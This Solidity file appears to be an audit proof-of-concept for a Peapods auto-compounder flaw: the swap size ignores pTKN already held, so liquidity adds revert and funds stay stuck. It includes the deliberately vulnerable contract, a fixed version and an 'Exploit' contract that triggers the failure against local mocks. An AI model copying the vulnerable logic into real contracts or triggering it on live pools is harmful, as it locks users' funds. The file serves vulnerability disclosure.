// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Peapods — AutoCompoundingPodLp._pairedLpTokenToPodLp (Sherlock 2025-01, H-4).
    _getSwapAmt ignores pTKN already held. A 10_000 pTKN leftover plus
    10_000 new paired tokens is swapped again, leaving about 5_000 paired
    against about 15_000 pTKN. addLPAndStake reverts at 50% slippage.
    Both balances stay in the compounder. Pairing the leftover first
    mints LP and leaves nothing stuck. */

contract ERC20 {
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _symbol) {
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract DexAdapter {
    ERC20 public paired;
    ERC20 public pod;
    uint112 public reserve0;
    uint112 public reserve1;

    constructor(ERC20 _paired, ERC20 _pod) {
        paired = _paired;
        pod = _pod;
    }

    function seed(uint256 r0, uint256 r1) external {
        reserve0 = uint112(r0);
        reserve1 = uint112(r1);
        paired.mint(address(this), r0);
        pod.mint(address(this), r1);
    }

    function getV2Pool(address, address) external view returns (address) {
        return address(this);
    }

    function getReserves(address) external view returns (uint112, uint112) {
        return (reserve0, reserve1);
    }

    function swapV2Single(address tokenIn, address, uint256 amountIn, uint256 minOut, address to)
        external
        returns (uint256 amountOut)
    {
        require(tokenIn == address(paired), "in");
        paired.transferFrom(msg.sender, address(this), amountIn);
        uint256 amountInWithFee = amountIn * 997;
        amountOut = amountInWithFee * reserve1 / (uint256(reserve0) * 1000 + amountInWithFee);
        require(amountOut >= minOut, "min");
        require(amountOut < reserve1, "res");
        reserve0 += uint112(amountIn);
        reserve1 -= uint112(amountOut);
        pod.transfer(to, amountOut);
    }
}

contract IndexUtils {
    ERC20 public pod;
    ERC20 public paired;
    uint256 public lpMinted;

    constructor(ERC20 _pod, ERC20 _paired) {
        pod = _pod;
        paired = _paired;
    }

    function addLPAndStake(
        address,
        uint256 podAmt,
        address,
        uint256 pairedAmt,
        uint256,
        uint256 slippage,
        uint256
    ) external returns (uint256 lpOut) {
        uint256 podMin = podAmt * (1000 - slippage) / 1000;
        uint256 pairedMin = pairedAmt * (1000 - slippage) / 1000;
        uint256 usePod = podAmt < pairedAmt ? podAmt : pairedAmt;
        uint256 usePaired = usePod;
        require(usePod >= podMin && usePaired >= pairedMin, "slip");
        pod.transferFrom(msg.sender, address(this), usePod);
        paired.transferFrom(msg.sender, address(this), usePaired);
        lpOut = usePod;
        lpMinted += lpOut;
    }
}

contract AutoCompoundingPodLp {
    ERC20 public paired;
    ERC20 public pod;
    DexAdapter public DEX_ADAPTER;
    IndexUtils public indexUtils;
    uint256 public protocolFee;
    uint256 public _protocolFees;
    uint256 public lpSlippage = 500;
    address public podOracle = address(0);
    uint256 public lpOut;
    bool public addFailed;

    constructor(ERC20 _paired, ERC20 _pod, DexAdapter dex, IndexUtils utils) {
        paired = _paired;
        pod = _pod;
        DEX_ADAPTER = dex;
        indexUtils = utils;
    }

    function compound(uint256 amountIn) external returns (uint256 amountOut) {
        amountOut = _pairedLpTokenToPodLp(amountIn, block.timestamp + 1);
        lpOut = amountOut;
    }

    function _pairedLpTokenToPodLp(uint256 _amountIn, uint256 _deadline) internal returns (uint256 _amountOut) {
        address _pairedLpToken = address(paired);
        uint256 _pairedSwapAmt = _getSwapAmt(_pairedLpToken, address(pod), _pairedLpToken, _amountIn);
        // @> VULN: the swap size ignores pTKN already in the contract, so a leftover makes the next add more unbalanced
        uint256 _pairedRemaining = _amountIn - _pairedSwapAmt;
        uint256 _minPtknOut;
        if (podOracle != address(0)) {
            _minPtknOut = 1;
        }
        paired.approve(address(DEX_ADAPTER), _pairedSwapAmt);
        try DEX_ADAPTER.swapV2Single(_pairedLpToken, address(pod), _pairedSwapAmt, _minPtknOut, address(this)) returns (
            uint256 _podAmountOut
        ) {
            _podAmountOut = pod.balanceOf(address(this));
            _pairedRemaining = paired.balanceOf(address(this)) - _protocolFees;
            pod.approve(address(indexUtils), _podAmountOut);
            paired.approve(address(indexUtils), _pairedRemaining);
            try indexUtils.addLPAndStake(address(pod), _podAmountOut, _pairedLpToken, _pairedRemaining, _pairedRemaining, lpSlippage, _deadline)
            returns (uint256 _lpTknOut) {
                _amountOut = _lpTknOut;
            } catch {
                addFailed = true;
            }
        } catch {
            addFailed = true;
        }
    }

    function _getSwapAmt(address _t0, address _t1, address _swapT, uint256 _fullAmt) internal view returns (uint256) {
        (uint112 _r0, uint112 _r1) = DEX_ADAPTER.getReserves(DEX_ADAPTER.getV2Pool(_t0, _t1));
        uint112 _r = _swapT == _t0 ? _r0 : _r1;
        return (_sqrt(uint256(_r) * (_fullAmt * 3988000 + uint256(_r) * 3988009)) - (uint256(_r) * 1997)) / 1994;
    }

    function _sqrt(uint256 y) internal pure returns (uint256 z) {
        if (y > 3) {
            z = y;
            uint256 x = y / 2 + 1;
            while (x < z) {
                z = x;
                x = (y / x + x) / 2;
            }
        } else if (y != 0) {
            z = 1;
        }
    }
}

contract CompounderFixed {
    ERC20 public paired;
    ERC20 public pod;
    IndexUtils public indexUtils;
    uint256 public lpOut;

    constructor(ERC20 _paired, ERC20 _pod, IndexUtils utils) {
        paired = _paired;
        pod = _pod;
        indexUtils = utils;
    }

    function compound(uint256 pairedIn) external returns (uint256) {
        uint256 podBal = pod.balanceOf(address(this));
        uint256 pairBal = paired.balanceOf(address(this));
        if (pairedIn < pairBal) pairBal = pairedIn;
        uint256 use = podBal < pairBal ? podBal : pairBal;
        pod.approve(address(indexUtils), use);
        paired.approve(address(indexUtils), use);
        lpOut = indexUtils.addLPAndStake(address(pod), use, address(paired), use, use, 500, block.timestamp + 1);
        return lpOut;
    }
}

contract Exploit {
    ERC20 public paired;
    ERC20 public pod;
    DexAdapter public dex;
    IndexUtils public utils;
    AutoCompoundingPodLp public compounder;
    uint256 public stuckPod;
    uint256 public stuckPaired;

    constructor() {
        paired = new ERC20("PAIRED");
        pod = new ERC20("pTKN");
        dex = new DexAdapter(paired, pod);
        utils = new IndexUtils(pod, paired);
        compounder = new AutoCompoundingPodLp(paired, pod, dex, utils);
        dex.seed(10000 ether, 10000 ether);
    }

    function run() external {
        pod.mint(address(compounder), 10000 ether);
        paired.mint(address(compounder), 10000 ether);
        compounder.compound(10000 ether);
        stuckPod = pod.balanceOf(address(compounder));
        stuckPaired = paired.balanceOf(address(compounder));
        require(compounder.addFailed(), "add");
        require(compounder.lpOut() == 0, "lp");
        require(stuckPod == 12925820234006285946425, "pod");
        require(stuckPaired == 5851640468012571892851, "paired");
    }
}
